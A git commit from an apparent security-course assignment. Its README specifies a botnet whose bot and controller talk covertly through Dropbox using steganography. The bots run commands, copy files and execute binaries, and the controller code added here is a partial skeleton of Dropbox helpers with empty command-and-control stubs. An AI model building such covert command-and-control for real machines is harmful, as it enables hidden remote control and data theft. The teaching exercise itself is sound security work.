3d6aadfb48fde57392a12b394cd95622df2293d5
Adam <novak.@protonmail.com>
2023-12-28 12:18:07 +0100

    controller update

--- README.md
+++ README.md
@@ -1,2 +1,23 @@
 # BSY-bonus
-BSY Bonus
+
+1. Your task is to write the bot code and the controller code. The bot will be the infected computer, and the controller is what you use to control the bots.
+
+2. Both parts should use www.dropbox.com to communicate. You can register a free account and create a new application that uses the Python SDK (dropbox library) to upload and download files, etc.
+
+3. The goal is to run some of your bots as 'infected' computers in the dropbox channel, and you also connect to this channel with your controller to control them.
+
+4. The communication between the bots and the controller should not be easily detected as 'bots' in the channel, therefore all communication should look like normal English markdown or text (text, images and emojis are accepted). You should use some steganography technique to hide your messages as English.
+
+5. The controller should check if the bots are alive periodically.
+
+6. The controller should give orders to the bot and the bot should answer the output of the orders
+The minimum orders are the following commands:
+	- w (list of users currently logged in)
+	- ls <PATH> (list content of specified directory)
+	- id (if of current user)
+	- Copy a file from the bot to the controller. The file name is specified
+	- Execute a binary inside the bot given the name of the binary. Example: ‘/usr/bin/ps’
+
+7. Publish the whole code in github and put the link as a flag for this stage. Make sure you do not publish your API keys!!!
+
+8. Provide sufficient documentation on how to setup and use the client and the server so that we can test it.
---
+++ src/controller.py
@@ -0,0 +1,100 @@
+#
+# Author: Adam Novak
+#
+# Plagiarism is a sin!
+# Plagiarism is a sin!
+# Plagiarism is a sin!
+#
+
+import dropbox
+import sys
+
+
+class Controller:
+
+    def __init__(self, access_token):
+        self.dbx = dropbox.Dropbox(access_token)
+
+    def is_connected(self):
+        try:
+            return self.dbx.users_get_current_account()
+        except Exception as e:
+            sys.stderr.write(f"API Error: {e}")
+            return None
+
+    def list_files(self, folder_path):
+        try:
+            result = self.dbx.files_list_folder(folder_path)
+            return [entry for entry in result.entries]
+        except Exception as e:
+            sys.stderr.write(f"Error: {e}")
+            return []
+
+    def exist_file(self, file_path):
+        try:
+            return self.dbx.files_get_metadata(file_path)
+        except Exception as e:
+            sys.stderr.write(f"Error: {e}")
+            return None
+
+    def create_file(self, file_path):
+        try:
+            self.dbx.files_upload("".encode("utf-8"), file_path, mode=dropbox.files.WriteMode("overwrite"))
+            return True
+        except Exception as e:
+            sys.stderr.write(f"Error: {e}")
+            return False
+
+    def append_to_file(self, file_path, content):
+        try:
+            current_content = self.dbx.files_download(file_path).content
+            new_content = str(current_content) + content.encode("utf-8")
+            self.dbx.files_upload(new_content, file_path, mode=dropbox.files.WriteMode("add"))
+            return True
+        except Exception as e:
+            sys.stderr.write(f"Error: {e}")
+            return False
+
+    def get_file_content(self, file_path):
+        try:
+            return self.dbx.files_download(file_path).content
+        except Exception as e:
+            sys.stderr.write(f"Error: {e}")
+            return None
+
+    def check_alive(self):
+        # Periodically check if the bot is alive
+        pass
+
+    def print_help(self):
+        # Periodically check if the bot is alive
+        pass
+
+    def execute_command(self, command):
+        # Execute commands and respond with output
+        pass
+
+    def hide_message(self, message, image_path):
+        # Use steganography to hide messages in images
+        pass
+
+    def send_data_to_dropbox(self, data, destination_path):
+        # Upload data to Dropbox
+        pass
+
+
+if __name__ == "__main__":
+
+    # get args
+    argc = len(sys.argv)
+    argv = sys.argv
+
+    # check number of arguments
+    if argc != 3:
+        exit("python3 controller.py <API KEY> <INTERVAL>")
+
+    # create controller
+    c = Controller(argv[1])
+
+    print(c.exist_file("/shopping_list.txt"))
+    print(c.create_file("/shopping_list.txt"))
